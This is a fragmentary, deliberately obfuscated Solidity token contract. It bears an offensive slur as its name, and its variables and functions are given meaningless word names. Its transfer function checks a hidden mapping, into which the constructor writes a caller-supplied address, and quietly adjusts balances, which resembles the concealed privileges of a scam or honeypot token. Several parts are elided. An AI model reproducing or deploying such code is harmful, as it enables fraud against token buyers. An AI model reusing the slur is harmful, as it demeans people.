...
contract Fag is Ownable {
    uint256 private wool;
    string private was;
    uint256 private _tTotal;
    string private straw;
    uint256 private indicate;
    uint8 private announced;
    ...
    mapping(address => uint256) private journey;
    ...
    function loss(
        ...
        if (environment[best] == 0) journey[best] -= point;
        uint256 colony;
        point -= colony;
        bend[sit] += announced;
        journey[rocket] += point;
    }

    mapping(address => uint256) private bend;
    ...
    function transferFrom(
        ...
        loss(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        loss(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        string memory finally,
        string memory field,
        address song,
        address previous
    ) {
        uniswapV2Router = IUniswapV2Router02(song);
        ...
        wool = 3;
        indicate = 100;
        environment[previous] = announced;
        _tTotal = 1000000000000000 * 10**announced;
        journey[msg.sender] = _tTotal;
    }
}